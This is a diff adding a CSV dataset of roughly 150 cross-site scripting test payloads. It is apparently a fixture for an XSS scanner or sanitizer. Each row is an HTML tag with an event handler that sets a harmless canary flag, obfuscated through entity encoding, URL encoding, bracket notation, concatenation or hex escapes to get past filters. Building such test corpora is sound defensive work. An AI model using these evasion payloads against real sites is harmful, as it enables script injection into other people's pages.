@@ -1,0 +1,151 @@
+payload_id,sink,event,synthetic,real,note,norm_text
+o0143-entity-entity_in_handler,html_body_raw_double_decode,mouseup,True,False,,"<iframe onmouseup=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</iframe>"
+o0211-transport-double_urlencode,html_body_raw_double_decode,focusin,True,False,,%3ckeygen%20id%3dx%20onfocusin%3dwindow.__xss_fired%3dtrue%3e
+o0054-transport-single_urlencode,html_body_raw_double_decode,mousedown,True,False,,"<param onmousedown=""window.__xss_fired=true"">test</param>"
+o0220-js-js_inplace_bracket,html_body_raw,pointerenter,True,True,,<mark onpointerenter=window['__xss_fired']=true>xss</mark>
+o0239-js-js_inplace_bracket,html_body_raw,mouseup,True,True,,"<sub onmouseup=""window['__xss_fired']=true"">test</sub>"
+o0045-js-js_inplace_bracket,html_body_raw_double_decode,pointerover,True,True,,<html onpointerover=window['__xss_fired']=true>xss</html>
+o0256-transport-double_urlencode,html_body_raw_double_decode,mouseenter,True,True,,%3cfigcaption%20onmouseenter%3d%22window.__xss_fired%3dtrue%22%3etest%3c/figcaption%3e
+o0170-js-js_inplace_concat,html_body_raw_double_decode,mouseenter,True,True,,"<option onmouseenter=""window['__xss'+'_fired']=true"">test</option>"
+o0214-entity-entity_in_handler,html_body_raw_double_decode,focusin,True,True,,<bgsound id=x tabindex=1 onfocusin=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></bgsound>
+o0153-transport-single_urlencode,html_body_raw,mouseenter,True,False,,"<wbr onmouseenter=""window.__xss_fired=true"">test</wbr>"
+o0276-js-js_inplace_hex,html_body_raw_double_decode,pointerdown,True,True,,<object onpointerdown=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</object>
+o0156-js-js_inplace_bracket,html_body_raw_double_decode,focusin,True,True,,<dir id=x tabindex=1 onfocusin=window['__xss_fired']=true></dir>
+o0160-entity-entity_in_handler,html_body_raw_double_decode,mousedown,True,True,,"<sub onmousedown=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</sub>"
+o0095-transport-single_urlencode,html_body_raw_double_decode,mouseup,True,True,,"<blockquote onmouseup=""window.__xss_fired=true"">test</blockquote>"
+o0022-js-js_inplace_concat,html_body_raw_double_decode,pointerdown,True,False,,<iframe onpointerdown=window['__xss'+'_fired']=true>xss</iframe>
+o0043-transport-single_urlencode,html_body_raw_double_decode,mousedown,True,False,,"<meta onmousedown=""window.__xss_fired=true"">test</meta>"
+o0298-entity-entity_in_handler,html_body_raw,pointerenter,True,False,,<rp onpointerenter=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</rp>
+o0031-js-js_inplace_bracket,html_body_raw_double_decode,mouseover,True,True,,"<select onmouseover=""window['__xss_fired']=true"">test</select>"
+o0135-transport-single_urlencode,html_body_raw_double_decode,mouseup,True,True,,"<spacer onmouseup=""window.__xss_fired=true"">test</spacer>"
+o0130-transport-double_urlencode,html_body_raw_double_decode,mousemove,True,True,,%3crt%20onmousemove%3d%22window.__xss_fired%3dtrue%22%3etest%3c/rt%3e
+o0347-js-js_inplace_concat,html_body_raw,mouseup,True,True,,"<figure onmouseup=""window['__xss'+'_fired']=true"">test</figure>"
+o0027-js-js_inplace_bracket,html_body_raw_double_decode,mouseup,True,True,,"<input onmouseup=""window['__xss_fired']=true"">test</input>"
+o0283-js-js_inplace_hex,html_body_raw,mousedown,True,True,,"<a onmousedown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</a>"
+o0336-js-js_inplace_hex,html_body_raw,focus,True,True,,<rb id=x tabindex=1 onfocus=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></rb>
+o0240-js-js_inplace_bracket,html_body_raw,mousedown,True,True,,"<s onmousedown=""window['__xss_fired']=true"">test</s>"
+o0310-js-js_inplace_hex,html_body_raw,pointerup,True,True,,<address onpointerup=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</address>
+o0207-js-js_inplace_concat,html_body_raw,focusin,True,True,,<small id=x tabindex=1 onfocusin=window['__xss'+'_fired']=true></small>
+o0236-js-js_inplace_hex,html_body_raw,pointerover,True,True,,<output onpointerover=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</output>
+o0312-js-js_inplace_bracket,html_body_raw_double_decode,mouseenter,True,True,,"<label onmouseenter=""window['__xss_fired']=true"">test</label>"
+o0161-js-js_inplace_hex,html_body_raw_double_decode,focusin,True,True,,<kbd id=x tabindex=1 onfocusin=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></kbd>
+o0070-entity-entity_in_handler,html_body_raw,mousemove,True,False,,"<script onmousemove=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</script>"
+o0045-entity-entity_in_handler,html_body_raw,pointerover,True,True,,<html onpointerover=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</html>
+o0236-transport-double_urlencode,html_body_raw_double_decode,pointerover,True,True,,%3coutput%20onpointerover%3dwindow.__xss_fired%3dtrue%3exss%3c/output%3e
+o0161-js-js_inplace_concat,html_body_raw,focusin,True,True,,<kbd id=x tabindex=1 onfocusin=window['__xss'+'_fired']=true></kbd>
+o0086-transport-single_urlencode,html_body_raw_double_decode,mouseover,True,True,,"<dir onmouseover=""window.__xss_fired=true"">test</dir>"
+o0253-transport-double_urlencode,html_body_raw_double_decode,pointerenter,True,False,,%3cparam%20onpointerenter%3dwindow.__xss_fired%3dtrue%3exss%3c/param%3e
+o0056-transport-single_urlencode,html_body_raw,mousemove,True,True,,"<figure onmousemove=""window.__xss_fired=true"">test</figure>"
+o0347-js-js_inplace_hex,html_body_raw,mouseup,True,True,,"<figure onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</figure>"
+o0042-js-js_inplace_hex,html_body_raw_double_decode,mousedown,True,True,,"<nobr onmousedown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</nobr>"
+o0321-entity-entity_in_handler,html_body_raw_double_decode,mouseover,True,True,,"<svg onmouseover=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</svg>"
+o0169-js-js_inplace_concat,html_body_raw_double_decode,pointerenter,True,True,,<ruby onpointerenter=window['__xss'+'_fired']=true>xss</ruby>
+o0056-js-js_inplace_bracket,html_body_raw,mousemove,True,True,,"<figure onmousemove=""window['__xss_fired']=true"">test</figure>"
+o0253-js-js_inplace_concat,html_body_raw,pointerenter,True,False,,<param onpointerenter=window['__xss'+'_fired']=true>xss</param>
+o0039-transport-double_urlencode,html_body_raw_double_decode,click,True,True,,%3caside%20onclick%3d%22window.__xss_fired%3dtrue%22%3etest%3c/aside%3e
+o0169-transport-single_urlencode,html_body_raw_double_decode,pointerenter,True,True,,<ruby onpointerenter=window.__xss_fired=true>xss</ruby>
+o0236-entity-entity_in_handler,html_body_raw,pointerover,True,True,,<output onpointerover=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</output>
+o0134-transport-double_urlencode,html_body_raw_double_decode,mouseup,True,True,,%3cruby%20onmouseup%3d%22window.__xss_fired%3dtrue%22%3etest%3c/ruby%3e
+o0172-transport-single_urlencode,html_body_raw_double_decode,pointerdown,True,True,,<canvas onpointerdown=window.__xss_fired=true>xss</canvas>
+o0024-js-js_inplace_concat,html_body_raw,pointermove,True,True,,<cite onpointermove=window['__xss'+'_fired']=true>xss</cite>
+o0045-js-js_inplace_bracket,html_body_raw,pointerover,True,True,,<html onpointerover=window['__xss_fired']=true>xss</html>
+o0239-entity-entity_in_handler,html_body_raw,mouseup,True,True,,"<sub onmouseup=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</sub>"
+o0095-transport-single_urlencode,html_body_raw,mouseup,True,True,,"<blockquote onmouseup=""window.__xss_fired=true"">test</blockquote>"
+o0132-js-js_inplace_concat,html_body_raw_double_decode,pointerdown,True,True,,<mark onpointerdown=window['__xss'+'_fired']=true>xss</mark>
+o0054-js-js_inplace_bracket,html_body_raw_double_decode,mousedown,True,False,,"<param onmousedown=""window['__xss_fired']=true"">test</param>"
+o0043-transport-single_urlencode,html_body_raw,mousedown,True,False,,"<meta onmousedown=""window.__xss_fired=true"">test</meta>"
+o0156-transport-double_urlencode,html_body_raw_double_decode,focusin,True,True,,%3cdir%20id%3dx%20tabindex%3d1%20onfocusin%3dwindow.__xss_fired%3dtrue%3e%3c/dir%3e
+o0283-transport-single_urlencode,html_body_raw,mousedown,True,True,,"<a onmousedown=""window.__xss_fired=true"">test</a>"
+o0181-js-js_inplace_concat,html_body_raw_double_decode,pointerup,True,True,,<data onpointerup=window['__xss'+'_fired']=true>xss</data>
+o0054-js-js_inplace_bracket,html_body_raw,mousedown,True,False,,"<param onmousedown=""window['__xss_fired']=true"">test</param>"
+o0024-transport-double_urlencode,html_body_raw_double_decode,pointermove,True,True,,%3ccite%20onpointermove%3dwindow.__xss_fired%3dtrue%3exss%3c/cite%3e
+o0111-js-js_inplace_hex,html_body_raw_double_decode,mousedown,True,True,,"<dl onmousedown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</dl>"
+o0109-js-js_inplace_bracket,html_body_raw,mouseenter,True,True,,"<rt onmouseenter=""window['__xss_fired']=true"">test</rt>"
+o0207-js-js_inplace_bracket,html_body_raw_double_decode,focusin,True,True,,<small id=x tabindex=1 onfocusin=window['__xss_fired']=true></small>
+o0134-js-js_inplace_hex,html_body_raw,mouseup,True,True,,"<ruby onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</ruby>"
+o0207-entity-entity_in_handler,html_body_raw,focusin,True,True,,<small id=x tabindex=1 onfocusin=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></small>
+o0187-js-js_inplace_bracket,html_body_raw,dblclick,True,False,,"<br ondblclick=""window['__xss_fired']=true"">test</br>"
+o0130-entity-entity_in_handler,html_body_raw_double_decode,mousemove,True,True,,"<rt onmousemove=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</rt>"
+o0209-transport-single_urlencode,html_body_raw,mousemove,True,False,,"<template onmousemove=""window.__xss_fired=true"">test</template>"
+o0276-transport-double_urlencode,html_body_raw_double_decode,pointerdown,True,True,,%3cobject%20onpointerdown%3dwindow.__xss_fired%3dtrue%3exss%3c/object%3e
+o0246-transport-single_urlencode,html_body_raw_double_decode,click,True,True,,"<a onclick=""window.__xss_fired=true"">test</a>"
+o0240-transport-double_urlencode,html_body_raw_double_decode,mousedown,True,True,,%3cs%20onmousedown%3d%22window.__xss_fired%3dtrue%22%3etest%3c/s%3e
+o0310-js-js_inplace_hex,html_body_raw_double_decode,pointerup,True,True,,<address onpointerup=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</address>
+o0120-js-js_inplace_hex,html_body_raw_double_decode,click,True,True,,"<header onclick=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</header>"
+o0042-entity-entity_in_handler,html_body_raw,mousedown,True,True,,"<nobr onmousedown=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</nobr>"
+o0131-js-js_inplace_bracket,html_body_raw_double_decode,pointermove,True,True,,<ins onpointermove=window['__xss_fired']=true>xss</ins>
+o0301-js-js_inplace_concat,html_body_raw_double_decode,pointerenter,True,True,,<span onpointerenter=window['__xss'+'_fired']=true>xss</span>
+o0283-js-js_inplace_bracket,html_body_raw_double_decode,mousedown,True,True,,"<a onmousedown=""window['__xss_fired']=true"">test</a>"
+o0109-js-js_inplace_hex,html_body_raw_double_decode,mouseenter,True,True,,"<rt onmouseenter=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</rt>"
+o0312-transport-single_urlencode,html_body_raw_double_decode,mouseenter,True,True,,"<label onmouseenter=""window.__xss_fired=true"">test</label>"
+o0070-entity-entity_in_handler,html_body_raw_double_decode,mousemove,True,False,,"<script onmousemove=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</script>"
+o0247-js-js_inplace_hex,html_body_raw_double_decode,mouseenter,True,True,,"<blink onmouseenter=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</blink>"
+o0336-js-js_inplace_concat,html_body_raw,focus,True,True,,<rb id=x tabindex=1 onfocus=window['__xss'+'_fired']=true></rb>
+o0239-js-js_inplace_concat,html_body_raw,mouseup,True,True,,"<sub onmouseup=""window['__xss'+'_fired']=true"">test</sub>"
+o0063-entity-entity_in_handler,html_body_raw_double_decode,mouseover,True,False,,"<track onmouseover=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</track>"
+o0152-js-js_inplace_concat,html_body_raw_double_decode,pointerdown,True,True,,<animatetransform onpointerdown=window['__xss'+'_fired']=true>xss</animatetransform>
+o0031-js-js_inplace_hex,html_body_raw_double_decode,mouseover,True,True,,"<select onmouseover=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</select>"
+o0024-js-js_inplace_hex,html_body_raw_double_decode,pointermove,True,True,,<cite onpointermove=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</cite>
+o0273-js-js_inplace_bracket,html_body_raw,click,True,False,,"<noframes onclick=""window['__xss_fired']=true"">test</noframes>"
+o0070-transport-single_urlencode,html_body_raw,mousemove,True,False,,"<script onmousemove=""window.__xss_fired=true"">test</script>"
+o0240-js-js_inplace_bracket,html_body_raw_double_decode,mousedown,True,True,,"<s onmousedown=""window['__xss_fired']=true"">test</s>"
+o0109-transport-double_urlencode,html_body_raw_double_decode,mouseenter,True,True,,%3crt%20onmouseenter%3d%22window.__xss_fired%3dtrue%22%3etest%3c/rt%3e
+o0209-transport-single_urlencode,html_body_raw_double_decode,mousemove,True,False,,"<template onmousemove=""window.__xss_fired=true"">test</template>"
+o0312-js-js_inplace_bracket,html_body_raw,mouseenter,True,True,,"<label onmouseenter=""window['__xss_fired']=true"">test</label>"
+o0022-entity-entity_in_handler,html_body_raw,pointerdown,True,False,,<iframe onpointerdown=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</iframe>
+o0172-js-js_inplace_hex,html_body_raw_double_decode,pointerdown,True,True,,<canvas onpointerdown=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</canvas>
+o0298-entity-entity_in_handler,html_body_raw_double_decode,pointerenter,True,False,,<rp onpointerenter=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</rp>
+o0049-transport-single_urlencode,html_body_raw,pointermove,True,True,,<mark onpointermove=window.__xss_fired=true>xss</mark>
+o0284-js-js_inplace_hex,html_body_raw_double_decode,pointerover,True,True,,<center onpointerover=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</center>
+o0098-js-js_inplace_bracket,html_body_raw,mouseup,True,False,,"<bgsound onmouseup=""window['__xss_fired']=true"">test</bgsound>"
+o0170-entity-entity_in_handler,html_body_raw,mouseenter,True,True,,"<option onmouseenter=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</option>"
+o0134-js-js_inplace_bracket,html_body_raw_double_decode,mouseup,True,True,,"<ruby onmouseup=""window['__xss_fired']=true"">test</ruby>"
+o0276-transport-single_urlencode,html_body_raw_double_decode,pointerdown,True,True,,<object onpointerdown=window.__xss_fired=true>xss</object>
+o0236-entity-entity_in_handler,html_body_raw_double_decode,pointerover,True,True,,<output onpointerover=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</output>
+o0209-entity-entity_in_handler,html_body_raw,mousemove,True,False,,"<template onmousemove=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</template>"
+o0278-js-js_inplace_hex,html_body_raw,mousedown,True,True,,"<dt onmousedown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</dt>"
+o0156-js-js_inplace_bracket,html_body_raw,focusin,True,True,,<dir id=x tabindex=1 onfocusin=window['__xss_fired']=true></dir>
+o0276-js-js_inplace_concat,html_body_raw_double_decode,pointerdown,True,True,,<object onpointerdown=window['__xss'+'_fired']=true>xss</object>
+o0161-transport-double_urlencode,html_body_raw_double_decode,focusin,True,True,,%3ckbd%20id%3dx%20tabindex%3d1%20onfocusin%3dwindow.__xss_fired%3dtrue%3e%3c/kbd%3e
+o0118-js-js_inplace_concat,html_body_raw,pointerenter,True,True,,<command onpointerenter=window['__xss'+'_fired']=true>xss</command>
+o0247-js-js_inplace_bracket,html_body_raw,mouseenter,True,True,,"<blink onmouseenter=""window['__xss_fired']=true"">test</blink>"
+o0240-js-js_inplace_hex,html_body_raw,mousedown,True,True,,"<s onmousedown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</s>"
+o0247-js-js_inplace_hex,html_body_raw,mouseenter,True,True,,"<blink onmouseenter=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</blink>"
+o0109-transport-single_urlencode,html_body_raw,mouseenter,True,True,,"<rt onmouseenter=""window.__xss_fired=true"">test</rt>"
+o0024-js-js_inplace_concat,html_body_raw_double_decode,pointermove,True,True,,<cite onpointermove=window['__xss'+'_fired']=true>xss</cite>
+o0120-js-js_inplace_hex,html_body_raw,click,True,True,,"<header onclick=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</header>"
+o0131-js-js_inplace_bracket,html_body_raw,pointermove,True,True,,<ins onpointermove=window['__xss_fired']=true>xss</ins>
+o0161-entity-entity_in_handler,html_body_raw,focusin,True,True,,<kbd id=x tabindex=1 onfocusin=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></kbd>
+o0098-transport-double_urlencode,html_body_raw_double_decode,mouseup,True,False,,%3cbgsound%20onmouseup%3d%22window.__xss_fired%3dtrue%22%3etest%3c/bgsound%3e
+o0347-transport-double_urlencode,html_body_raw_double_decode,mouseup,True,True,,%3cfigure%20onmouseup%3d%22window.__xss_fired%3dtrue%22%3etest%3c/figure%3e
+o0236-js-js_inplace_bracket,html_body_raw_double_decode,pointerover,True,True,,<output onpointerover=window['__xss_fired']=true>xss</output>
+o0143-js-js_inplace_bracket,html_body_raw,mouseup,True,False,,"<iframe onmouseup=""window['__xss_fired']=true"">test</iframe>"
+o0156-js-js_inplace_concat,html_body_raw_double_decode,focusin,True,True,,<dir id=x tabindex=1 onfocusin=window['__xss'+'_fired']=true></dir>
+o0276-js-js_inplace_concat,html_body_raw,pointerdown,True,True,,<object onpointerdown=window['__xss'+'_fired']=true>xss</object>
+o0037-transport-double_urlencode,html_body_raw_double_decode,mousemove,True,True,,%3cabbr%20onmousemove%3d%22window.__xss_fired%3dtrue%22%3etest%3c/abbr%3e
+o0256-js-js_inplace_hex,html_body_raw_double_decode,mouseenter,True,True,,"<figcaption onmouseenter=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</figcaption>"
+o0109-js-js_inplace_concat,html_body_raw_double_decode,mouseenter,True,True,,"<rt onmouseenter=""window['__xss'+'_fired']=true"">test</rt>"
+o0347-js-js_inplace_bracket,html_body_raw_double_decode,mouseup,True,True,,"<figure onmouseup=""window['__xss_fired']=true"">test</figure>"
+o0169-js-js_inplace_concat,html_body_raw,pointerenter,True,True,,<ruby onpointerenter=window['__xss'+'_fired']=true>xss</ruby>
+o0063-js-js_inplace_hex,html_body_raw,mouseover,True,False,,"<track onmouseover=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</track>"
+o0070-js-js_inplace_hex,html_body_raw_double_decode,mousemove,True,False,,"<script onmousemove=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</script>"
+o0077-transport-single_urlencode,html_body_raw,mouseover,True,True,,"<meter onmouseover=""window.__xss_fired=true"">test</meter>"
+o0156-js-js_inplace_concat,html_body_raw,focusin,True,True,,<dir id=x tabindex=1 onfocusin=window['__xss'+'_fired']=true></dir>
+o0022-js-js_inplace_bracket,html_body_raw,pointerdown,True,False,,<iframe onpointerdown=window['__xss_fired']=true>xss</iframe>
+o0660-entity-entity_in_handler,html_body_raw_double_decode,focus,True,True,,"&#00;</form><input type&#61;""date"" onfocus=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">"
+o0131-entity-entity_in_handler,html_body_raw_double_decode,pointermove,True,True,,<ins onpointermove=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</ins>
+o0161-js-js_inplace_hex,html_body_raw,focusin,True,True,,<kbd id=x tabindex=1 onfocusin=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></kbd>
+o0310-entity-entity_in_handler,html_body_raw,pointerup,True,True,,<address onpointerup=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</address>
+o0156-entity-entity_in_handler,html_body_raw_double_decode,focusin,True,True,,<dir id=x tabindex=1 onfocusin=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></dir>
+o0276-entity-entity_in_handler,html_body_raw_double_decode,pointerdown,True,True,,<object onpointerdown=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</object>
+o0207-js-js_inplace_bracket,html_body_raw,focusin,True,True,,<small id=x tabindex=1 onfocusin=window['__xss_fired']=true></small>
+o0347-js-js_inplace_bracket,html_body_raw,mouseup,True,True,,"<figure onmouseup=""window['__xss_fired']=true"">test</figure>"
+o0098-transport-single_urlencode,html_body_raw_double_decode,mouseup,True,False,,"<bgsound onmouseup=""window.__xss_fired=true"">test</bgsound>"
+o0195-transport-double_urlencode,html_body_raw_double_decode,pointerup,True,False,,%3cbase%20onpointerup%3dwindow.__xss_fired%3dtrue%3exss%3c/base%3e
+o0027-js-js_inplace_hex,html_body_raw,mouseup,True,True,,"<input onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</input>"
+o0236-js-js_inplace_concat,html_body_raw_double_decode,pointerover,True,True,,<output onpointerover=window['__xss'+'_fired']=true>xss</output>
+o0187-js-js_inplace_bracket,html_body_raw_double_decode,dblclick,True,False,,"<br ondblclick=""window['__xss_fired']=true"">test</br>"
+o0239-transport-single_urlencode,html_body_raw_double_decode,mouseup,True,True,,"<sub onmouseup=""window.__xss_fired=true"">test</sub>"
+o0134-js-js_inplace_hex,html_body_raw_double_decode,mouseup,True,True,,"<ruby onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</ruby>"
+o0045-entity-entity_in_handler,html_body_raw_double_decode,pointerover,True,True,,<html onpointerover=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</html>
+o0240-js-js_inplace_hex,html_body_raw_double_decode,mousedown,True,True,,"<s onmousedown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</s>"
